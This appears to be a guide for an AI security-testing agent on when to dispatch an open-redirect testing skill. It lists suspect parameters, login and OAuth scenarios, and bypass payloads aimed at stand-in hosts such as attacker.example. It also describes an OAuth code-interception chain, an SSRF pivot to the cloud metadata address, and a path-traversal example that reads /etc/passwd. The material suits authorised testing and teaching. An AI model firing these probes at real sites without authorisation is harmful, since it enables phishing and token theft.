# open-redirect — when to use

## Trigger signals (dispatch this skill the moment you observe…)

- **A request parameter whose value is, or contains, a URL or path.** If you see `?next=/dashboard`, `?redirect=https://...`, `?url=...`, `?return=...`, `?returnUrl=`, `?returnTo=`, `?continue=`, `?goto=`, `?dest=`, `?target=`, `?back=`, `?to=`, `?out=`, `?r=`, `?u=`, `?callback=`, `?redir=`, `?forward=`, `?destination=`, `?image_url=`, `?file=` (URL-shaped) → this skill applies. The single strongest tell is a parameter value that already holds a `/path`, a `//host`, or a full `scheme://host`.
- **A 3xx response with a `Location:` header that echoes your input.** If you send `?next=/foo` and the response is `302` with `Location: /foo` (or `Location: https://target/foo`) → the redirect target is user-driven. That is the core fingerprint.
- **A `Location:` value that flips to your host when you supply an absolute URL.** If `?next=https://example.org` yields `Location: https://example.org` → confirmed open redirect; if it 302s back to the app instead, you're in allowlist-bypass territory (still this skill).
- **Login / logout / SSO flows that carry a "where to go after" parameter.** `?next=` on a login form, `?service=`, `RelayState=`, `redirect_uri=`, `post_logout_redirect_uri=` → dispatch. OAuth/OIDC `redirect_uri` is the highest-impact variant.
- **A meta refresh or client-side navigation seeded from input.** If the HTML contains `<meta http-equiv="refresh" content="0;url=USERINPUT">` or JS `location.href = param` / `router.push(searchParams.get('next'))` → client-side open redirect, this skill.
- **Generic redirector endpoints in the path.** Paths like `/out`, `/r/`, `/redirect`, `/link`, `/away`, `/exit`, `/go`, `/cgi-bin/redirect.cgi` → these redirect by design and frequently skip scheme checks. Dispatch on sight.
- **An email/verification/invite/unsubscribe link with a tracking-style URL parameter.** These are open redirects in the wild more often than any other surface.
- **A partial block that smells like substring matching.** If `?next=https://evil.com` is rejected but `?next=https://target.com.evil.com` or `?next=//evil.com` slips through → naive validator, this skill's bypass matrix is exactly the move.

## Use-case scenarios

- **Post-authentication "return to" plumbing.** Almost every app with a login wall stores where the user was headed and bounces them there after auth. That parameter (`next`, `returnUrl`, `ReturnUrl`, `service`, `continue`) is the canonical open-redirect surface. It is high value because a redirect on the trusted login domain turns into a credible phishing pivot: the victim sees the real bank/SSO login, authenticates, and is then thrown to the attacker page from a URL that started on the trusted origin.
- **OAuth / OIDC / SAML redirect handling.** When you see an authorization request with `redirect_uri=`, `state=`, or a SAML `RelayState=`, this skill is the right move even when there's a registered allowlist — because the *interesting* bug is whether arbitrary subpaths/query-strings on the registered host are accepted, or whether an open redirect *on* the registered host can be chained to bounce the authorization `code`/token to you. `post_logout_redirect_uri` is consistently the weakest-validated of the set.
- **Server-side fetchers that follow redirects (SSRF feeder).** Link unfurlers, URL previewers, webhook validators, screenshot/PDF services, "import from URL" features. If the app fetches a URL you control and follows 3xx, an open redirect on an allowlisted domain becomes the pivot that defeats an SSRF destination allowlist (bounce `allowed-host → 169.254.169.254`). Dispatch this skill in tandem with SSRF testing whenever a fetcher follows redirects.
- **Reverse proxy / gateway header-driven redirects.** When absolute-URL construction depends on `Host` / `X-Forwarded-Host` / `X-Forwarded-Proto`, or the stack honors `X-Original-URL` / `X-Rewrite-URL`, the redirect target can be steered via headers rather than a visible query param.
- **Multi-hop chains.** Any flow where one redirect leads to another and only the first hop is validated — trusted → internal redirector → external. The second hop is where the escape happens.
- **URL shorteners, "share", and outbound-link handlers** — they exist to redirect and routinely lack scheme/protocol checks.

## Concrete tells (request → response examples)

- **Naive open redirect (the smoking gun):**
  Probe: `GET /login?next=https://attacker.example/ HTTP/1.1`
  Response: `302 Found` + `Location: https://attacker.example/` → confirmed. Capture the first-hop `Location`, not the final 200.
- **Protocol-relative bypass (defeats a `startsWith("/")` check):**
  Probe: `?next=//attacker.example`
  Response: `Location: //attacker.example` → browser treats it as a cross-origin redirect. Same for `/\attacker.example` and `\/\/attacker.example`.
- **Userinfo trick (defeats host-parsing validators):**
  Probe: `?redirect=https://target.example@attacker.example`
  Tell: validator logs/allows because it parses host as `target.example`, but `Location` is emitted verbatim and the browser navigates to `attacker.example`. Variant `https://target.example%40attacker.example`.
- **Substring allowlist bypass:**
  Probe: `?url=https://target.example.attacker.com` and `?url=https://attacker.com/?x=target.example`
  Tell: one of these returns `Location:` with your host while `https://attacker.com` alone is rejected → the check is `contains("target.example")`.
- **Double-encoding differential:**
  Probe: `?next=%2f%2fattacker.example` then `?next=%252f%252fattacker.example`
  Tell: the validator sees one string, the emitted `Location` decodes to `//attacker.example`. Edge-decodes-once, origin-decodes-again behavior is the signature.
- **Scheme smuggling / lenient parsers:**
  Probe: `?next=https;/attacker.example`, `?next=http:attacker.example`, `?next=hTtPs://attacker.example`
  Tell: any of these reaching the `Location` header means the parser is lenient.
- **Client-side only (no `Location` header):**
  Tell: first response is `200` (not 3xx) but the body contains `<meta http-equiv="refresh" content="0;url=ATTACKER">` or inline `location = "ATTACKER"`. The server-side check passed your value into JS/HTML, where the browser executes the navigation — different parser, different bypasses.
- **OAuth code interception setup:**
  Probe: `redirect_uri=https://trusted.example/out?url=https://attacker.tld/cb`
  Tell: the IdP accepts it because host is `trusted.example`; the app's own `/out` redirector then forwards the `code` to `attacker.tld`.

## When NOT to use it / easily-confused-with

- **Reflected value that lands in HTML/JS but does not drive navigation → that's XSS, not open redirect.** If your input is echoed into the page body and rendered/executed but no redirect occurs, dispatch the XSS skill. (Note the overlap: a `data:`/`javascript:`-scheme redirect *target* that the browser executes is an open-redirect-to-XSS chain — only then does this skill apply to the script execution.)
- **A user-controlled URL that the *server* fetches and returns/acts on (not redirects to) → that's SSRF, not open redirect.** Open redirect is about steering the *client's* navigation (or chaining a fetcher's 3xx-follow). If the server fetches the URL itself and you never see a 3xx aimed at you, route to SSRF. Use this skill alongside SSRF only when an open redirect is the chaining primitive.
- **A redirect strictly confined to same-origin relative paths with robust normalization → not exploitable.** If every variant (`//`, `\`, `@`, encoded, IDN) is rejected or normalized to a local path and the `Location` is always same-origin, it's correctly validated — do not flag.
- **Strictly pre-registered OAuth `redirect_uri` with exact-match verification → not this skill** unless you can find arbitrary-subpath/query acceptance or an open redirect on the registered host to chain.
- **Path traversal / LFI parameters that happen to look URL-ish (`?file=../../etc/passwd`) → that's path traversal/LFI**, not open redirect. The tell is filesystem access vs. an emitted `Location`/navigation.
- **CRLF in the redirect target that splits the response and injects headers → that's HTTP response splitting / header injection**, a distinct (often co-located) issue. Open redirect is the destination change; the header-injection skill owns the `\r\n` smuggling.
- **A redirect that always shows the user an interstitial with the exact final destination before navigating → low/no impact**; treat as a false positive unless the interstitial itself is bypassable.

B:open-redirect done

